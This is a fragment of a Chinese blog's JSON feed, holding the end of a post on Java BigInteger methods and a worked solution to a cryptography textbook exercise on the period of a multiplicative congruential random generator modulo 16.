certainty)</code></p>\n<p>判断是否可能为素数，素数准确率为<span\nclass=\"math inline\">1 − 1/2<sup><em>c</em><em>e</em><em>r</em><em>t</em><em>a</em><em>i</em><em>n</em><em>t</em><em>y</em></sup></span>。</p></li>\n<li><p><code>public int compareTo(BigInteger val)</code></p>\n<p>比较大小。小于返回<code>-1</code>，相等返回<code>0</code>，大于返回<code>1</code>。</p></li>\n<li><p><code>public boolean equals(Object x)</code></p>\n<p>判断是否相等。</p></li>\n<li><p><code>public String toString(int radix)</code></p>\n<p>返回以<code>radix</code>进制表示的字符串。若不传入参数，默认为十进制。</p></li>\n<li><p><code>public int intValue()</code></p>\n<p>将<code>BigInteger</code>转为<code>int</code>。</p></li>\n</ul>\n<h2 id=\"参考资料\">参考资料</h2>\n<aside id=\"footnotes\" class=\"footnotes footnotes-end-of-document\"\nrole=\"doc-endnotes\">\n<hr />\n<ol>\n<li id=\"fn1\"><p><a\nhref=\"https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/math/BigInteger.html\">BigInteger\n(Java SE 14 &amp; JDK 14)</a><a href=\"#fnref1\" class=\"footnote-back\"\nrole=\"doc-backlink\">↩︎</a></p></li>\n</ol>\n</aside>\n",
            "tags": [
                "Java",
                "密码学",
                "RSA"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/cryptography-and-network-security-problem-8.2/",
            "url": "https://blog.meancoder.xyz/2020/cryptography-and-network-security-problem-8.2/",
            "title": "密码编码学与网络安全第七版习题 8.2",
            "date_published": "2020-04-18T11:37:12.000Z",
            "content_html": "<p>这道题是密码学的作业，开始不会写，答案只有结果而没有过程，后来查了一些资料才算是搞明白了。</p>\n<p>题目如下：</p>\n<blockquote>\n<ol type=\"a\">\n<li>下述的伪随机数发生器可获得的最大周期是多少？</li>\n</ol>\n<p><span\nclass=\"math display\"><em>X</em><sub><em>n</em> + 1</sub> = (<em>a</em><em>X</em><sub><em>n</em></sub>) mod  2<sup>4</sup></span></p>\n<ol start=\"2\" type=\"a\">\n<li><p>这时 a 为多少？</p></li>\n<li><p>对种子有什么要求？</p></li>\n</ol>\n</blockquote>\n<span id=\"more\"></span>\n<p>解答如下：</p>\n<h2 id=\"a\">(a)</h2>\n<blockquote>\n<p>首先引入这样一个结论：对任意的奇数<span\nclass=\"math inline\"><em>a</em></span>与正整数<span\nclass=\"math inline\"><em>n</em></span>，有：<span\nclass=\"math inline\"><em>a</em><sup>2<sup><em>n</em></sup></sup> ≡ 1 (mod  2<sup><em>n</em> + 2</sup>)</span>。用归纳法证明这个结论：</p>\n<ol type=\"1\">\n<li><p>当<span\nclass=\"math inline\"><em>n</em> = 1</span>时，存在整数<span\nclass=\"math inline\"><em>b</em></span>，<span\nclass=\"math inline\"><em>c</em></span>，使得</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup><em>n</em></sup></sup> = (2<em>b</em>+1)<sup>2</sup> = 4<em>b</em>(<em>b</em>+1) + 1 = 2<sup>3</sup><em>c</em> + 1 ≡ 1 (mod  2<sup>3</sup>)</span></p></li>\n<li><p>假设当<span\nclass=\"math inline\"><em>n</em> = <em>k</em></span>时，命题成立，即</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup><em>k</em></sup></sup> ≡ 1 (mod  2<sup><em>k</em> + 2</sup>)</span></p>\n<p>则存在整数<span class=\"math inline\"><em>c</em></span>，使得</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup><em>k</em></sup></sup> = 2<sup><em>k</em> + 2</sup><em>c</em> + 1</span></p>\n<p>当<span\nclass=\"math inline\"><em>n</em> = <em>k</em> + 1</span>时，存在整数<span\nclass=\"math inline\"><em>k</em></span>，<span\nclass=\"math inline\"><em>b</em></span>，使得</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup><em>k</em> + 1</sup></sup> = (2<sup><em>k</em> + 2</sup><em>c</em>+1)<sup>2</sup> = 2<sup>2<em>k</em> + 4</sup><em>c</em><sup>2</sup> + 2 · 2<sup><em>k</em> + 2</sup><em>c</em> + 1 = 2<sup><em>k</em> + 3</sup><em>c</em>(2<sup><em>k</em> + 1</sup><em>c</em>+1) + 1 ≡ 1 (mod  2<sup><em>k</em> + 3</sup>)</span></p>\n<p>即当<span\nclass=\"math inline\"><em>n</em> = <em>k</em> + 1</span>时，命题成立。</p></li>\n</ol>\n<p>由 1，2 可得，该命题成立。</p>\n</blockquote>\n<p>若<span class=\"math inline\"><em>a</em></span>与<span\nclass=\"math inline\">2<sup>4</sup></span>不互素，即<span\nclass=\"math inline\"><em>a</em></span>为偶数，令<span\nclass=\"math inline\"><em>a</em> = 2<em>k</em></span>，则</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>4</sup> = 16<em>k</em><sup>4</sup> ≡ 0 (mod  2<sup>4</sup>)</span></p>\n<p>从而</p>\n<p><span\nclass=\"math display\">0 = <em>X</em><sub><em>n</em> + 4</sub> ≡ <em>a</em><sup>4</sup><em>X</em><sub><em>n</em></sub> (mod  2<sup>4</sup>)</span></p>\n<p>产生的第四个数之后全为 0，所以<span\nclass=\"math inline\"><em>a</em></span>与<span\nclass=\"math inline\">2<sup>4</sup></span>互素。</p>\n<p>又因为</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup><em>n</em></sup></sup> ≡ 1 (mod  2<sup><em>n</em> + 2</sup>)</span></p>\n<p>所以</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>2<sup>4 − 2</sup></sup> = <em>a</em><sup>4</sup> ≡ 1 (mod  2<sup>4</sup>)</span></p>\n<p>从而</p>\n<p><span\nclass=\"math display\"><em>a</em><sup>4</sup><em>X</em><sub><em>n</em></sub> ≡ <em>X</em><sub><em>n</em></sub> (mod  2<sup>4</sup>)</span></p>\n<p>即</p>\n<p><span\nclass=\"math display\"><em>X</em><sub><em>n</em> + 4</sub> = <em>X</em><sub><em>n</em></sub></span></p>\n<p>所以最大周期为 4。</p>\n<h2 id=\"b\">(b)</h2>\n<p>由(a)可知，<span class=\"math inline\"><em>a</em></span>为奇数。</p>\n<p>经计算，<span\nclass=\"math inline\"><em>a</em> = 7, 9, 15</span>时，周期为 2。</p>\n<p><span class=\"math inline\"><em>a</em> = 3, 5, 11, 13</span>时，周期为\n4。</p>\n<h2 id=\"c\">(c)</h2>\n<p>种子必须为奇数，否则周期会不大于 2。</p>\n",
            "tags": [
                "密码学"
            ]
        }
    ]
}